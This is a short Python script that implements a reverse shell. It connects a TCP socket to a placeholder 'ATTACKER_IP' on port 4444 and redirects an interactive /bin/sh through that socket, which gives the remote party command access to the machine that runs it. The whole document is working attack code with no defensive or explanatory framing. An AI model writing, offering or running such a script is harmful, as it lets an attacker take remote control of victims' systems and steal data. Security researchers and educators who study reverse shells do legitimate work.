import socket
import subprocess

HOST = 'ATTACKER_IP'  # Replace with the IP address of the attacker's system
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Redirect input/output to the socket
subprocess.Popen(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())